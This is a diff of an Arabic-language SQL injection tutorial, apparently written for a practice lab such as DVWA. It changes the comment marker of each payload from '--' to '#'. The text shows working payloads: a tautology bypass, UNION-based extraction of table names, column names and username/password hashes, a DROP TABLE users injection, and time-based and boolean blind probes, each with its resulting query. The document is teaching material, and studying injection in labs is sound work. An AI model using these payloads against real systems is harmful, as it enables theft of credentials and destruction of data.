@@ -15,7 +15,7 @@
 ### 🔹 الصيغة المستخدمة:
 
 ```sql
-1' OR '1'='1' --
+1' OR '1'='1' #
 ```
 
 ### 🔹 كيف تعمل:
@@ -33,13 +33,13 @@ SELECT first_name, last_name FROM users WHERE user_id = '$id';
 إذا أرسلنا:
 
 ```
-?id=1' OR '1'='1' --
+?id=1' OR '1'='1' #
 ```
 
 الاستعلام يصبح:
 
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1' --';
+SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1' #';
 ```
 
 الجزء `'1'='1'` هو دائمًا صحيح، مما يعني أن قاعدة البيانات ستُرجع كل الصفوف.
@@ -65,7 +65,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1' --';
 ### 🔹 الصيغة المستخدمة:
 
 ```sql
-' UNION SELECT table_name, NULL FROM information_schema.tables --
+' UNION SELECT table_name, NULL FROM information_schema.tables #
 ```
 
 ### 🔹 كيف تعمل:
@@ -79,7 +79,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1' --';
 الاستعلام الناتج:
 
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT table_name, NULL FROM information_schema.tables --';
+SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT table_name, NULL FROM information_schema.tables #';
 ```
 
 ### 🔹 ملاحظات مهمة:
@@ -108,7 +108,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT table_na
 ### 🔹 الصيغة المستخدمة:
 
 ```sql
-' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #
 ```
 
 ### 🔹 كيف تعمل:
@@ -123,7 +123,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT table_na
 الاستعلام الناتج:
 
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --';
+SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #';
 ```
 
 ### 🔹 ملاحظات:
@@ -158,7 +158,7 @@ email
 ### 🔹 الصيغة المستخدمة:
 
 ```sql
-' UNION SELECT username, password FROM users --
+' UNION SELECT username, password FROM users #
 ```
 
 ### 🔹 كيف تعمل:
@@ -170,7 +170,7 @@ email
 ### 🔹 مثال توضيحي:
 
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT username, password FROM users --';
+SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT username, password FROM users #';
 ```
 
 ### 🔹 ملاحظات:
@@ -205,7 +205,7 @@ user1 | e99a18c428cb38d5f260853678922e03
 ### 🔹 الصيغة المستخدمة:
 
 ```sql
-1'; DROP TABLE users; --
+1'; DROP TABLE users; #
 ```
 
 ### 🔹 كيف تعمل:
@@ -217,7 +217,7 @@ user1 | e99a18c428cb38d5f260853678922e03
 ### 🔹 مثال توضيحي:
 
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '1'; DROP TABLE users; --';
+SELECT first_name, last_name FROM users WHERE user_id = '1'; DROP TABLE users; #';
 ```
 
 ### 🔹 ملاحظات:
@@ -245,7 +245,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1'; DROP TABLE users; -
 ### 🔹 الصيغة المستخدمة:
 
 ```sql
-1' AND SLEEP(5) --
+1' AND SLEEP(5) #
 ```
 
 ### 🔹 كيف تعمل:
@@ -257,7 +257,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1'; DROP TABLE users; -
 ### 🔹 مثال توضيحي:
 
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '1' AND SLEEP(5) --';
+SELECT first_name, last_name FROM users WHERE user_id = '1' AND SLEEP(5) #';
 ```
 
 ### 🔹 النتيجة:
@@ -280,8 +280,8 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' AND SLEEP(5) --';
 ### 🔹 الصيغ المستخدمة:
 
 ```sql
-1' AND 1=1 --
-1' AND 1=2 --
+1' AND 1=1 #
+1' AND 1=2 #
 ```
 
 ### 🔹 كيف تعمل:
@@ -293,8 +293,8 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' AND SLEEP(5) --';
 ### 🔹 الاستعلامات الناتجة:
 
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=1 --';
-SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=2 --';
+SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=1 #';
+SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=2 #';
 ```
 
 ### 🔹 النتيجة:
